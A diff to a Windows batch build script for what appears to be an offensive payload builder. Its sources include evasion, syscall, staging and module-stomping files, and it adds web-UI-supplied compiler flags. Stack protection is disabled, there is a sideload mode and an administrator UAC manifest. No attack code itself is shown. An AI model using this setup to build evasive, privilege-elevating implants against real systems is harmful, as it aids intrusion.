@@ -38,6 +38,9 @@ SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Stomper.c
 SET CFLAGS=/O1 /GS- /W0 /std:c17 /nologo
 SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS kernel32.lib user32.lib
 
+REM --- Optional extra flags from the web UI or caller (e.g. /DDEBUG) ---
+IF DEFINED CFLAGS_EXTRA SET CFLAGS=%CFLAGS% %CFLAGS_EXTRA%
+
 REM --- EXE UAC: embed requireAdministrator manifest ---
 IF NOT "%1"=="sideload" IF %UAC%==1 SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS /MANIFEST:EMBED /MANIFESTUAC:"level='requireAdministrator' uiAccess='false'" kernel32.lib user32.lib
 IF NOT "%1"=="sideload" IF %UAC%==1 echo [*] UAC manifest enabled
